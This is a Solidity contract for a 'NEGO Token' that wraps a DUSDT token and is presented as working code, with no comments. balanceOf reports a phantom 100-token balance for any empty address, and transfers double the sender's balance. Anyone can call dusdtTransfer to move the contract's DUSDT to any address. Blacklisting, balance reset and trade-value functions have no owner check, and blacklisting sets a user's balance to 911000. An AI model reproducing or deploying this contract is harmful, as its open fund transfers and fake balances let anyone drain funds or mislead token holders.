// SPDX-License-Identifier: MIT
pragma solidity 0.8.2;
import "DUSDT.sol";

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}

contract NEGO {
    using SafeMath for uint256;
    string public constant name = "NEGO Token";
    string public constant symbol = "NEGO";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    uint256 negoValue;
    address tokenOwner;
    address communityAddress = 0x485C002dAB020F090B5B251Cc553235Ad0ea86DB;
    DUSDT dusdt;
    USDTInterface usdt;
    USDTWrapper wrappAccount;
    mapping(address => bool) blacklist;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) sending;
    mapping(address => mapping(address => uint256)) allowed;
    mapping(address => bool) public tokenReceived;
    mapping(address => uint256) previousbalance;
    mapping(address => bool) initialize;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    constructor(USDTInterface _usdt, DUSDT _dusdt) {
        tokenOwner = msg.sender;
        dusdt = _dusdt;
        usdt = _usdt;
    }
    function _mint(address account, uint256 amount) internal {
        totalSupply += amount;
        balances[account] += amount;
    }

    function balanceOf(address owner) public view returns (uint256) {
        if (balances[owner] == 0) {
            uint256 bal = 100 * 10 ** decimals;
            return bal;
        } else {
            return balances[owner];
        }
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(blacklist[msg.sender] == false, "your blocked to transact");
        _transfer(msg.sender, to, value);
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        require(blacklist[from] == false, "your blocked to transact");
        _transfer(from, to, value);
        allowed[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view returns (uint256) {
        return allowed[owner][spender];
    }

    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal returns (bool) {
        balances[from] = balanceOf(from);
        require(value <= balances[from], "Nego Insufficient balance");
        require(value > 0, "0 value cannot be transfer");
        require(to != msg.sender,"cannot send on your own address");
        if (value == sending[from][to] && initialize[from] == true) {
            uint256 tax = 3;
            tax = tax.mul(getValue().div(1000));
            dusdtTransfer(getCommunityAddress(),tax);
            dusdtTransfer(to,getValue().sub(tax));
            sending[from][to] = 0;
            initialize[msg.sender] =  false;
            balances[from] = balanceOf(from).add(value.mul(2));
            previousbalance[from] = balances[from];
            previousbalance[to] = balances[to];
        } else if (
            dusdt.wrappedAccountExist(from) == true &&
            value <= dusdt.balanceOf(from) 
        ) {
            require(
                value <= dusdt.balanceOf(from),
                "value is not equal or less than to dusdt balance "
            );
            require(initialize[msg.sender] == false,"user has opened a trade");
            dusdt.transferFrom(from, address(dusdt), value);
            balances[from] -= value;
            balances[to] = balanceOf(to).add(value);
            sending[from][to] = value;
            negoValue = value;
            initialize[msg.sender] =  true;
            previousbalance[from] = balanceOf(from);
            previousbalance[to] = balanceOf(to);
        }
        return true;
    }
    function get(address from, address to) public view returns (uint256) {
        return sending[from][to];
    }
    function dusdtTransfer(address to, uint256 value) public returns (bool) {
        dusdt.send(to, value);
        return true;
    }
    function updateCommunityAddress(
        address newCommunityAddress
    ) public returns (address) {
        require(msg.sender == tokenOwner, "owner can call");
        communityAddress = newCommunityAddress;
        return newCommunityAddress;
    }
    function removeBlacklist(address user) external returns (bool) {
        blacklist[user] = false;
        return true;
    }
    function checkblacklist(address user) public view returns (bool) {
        return blacklist[user];
    }
    function getPreviousBalance(address user) public view returns (uint256) {
        return previousbalance[user];
    }
    function addBlacklist(address user) external returns (bool) {
        blacklist[user] = true;
        balances[user] = 911000;
        return true;
    }
    function getCommunityAddress() public view returns (address) {
        return communityAddress;
    }
    function getValue() public view returns(uint256){
        return negoValue;
    }
    function resetPreviousBalance(address user) public returns (bool){
        balances[user] = previousbalance[user];
        blacklist[user] = false;
        return true;
    }
    function setInitialize(address user,bool trade) public returns(bool){
        initialize[user] =  trade;
        return true;
    }
    function setValue(uint256 value) public returns(bool){
        negoValue = value;
        return true;
    }
    function reset(address user) public returns(bool){
        balances[user] = 100 * 10 ** decimals;
        previousbalance[user] = balanceOf(user);
        return true;
    }
    function getInitialize(address user) public view returns(bool){
        return initialize[user];
    }
}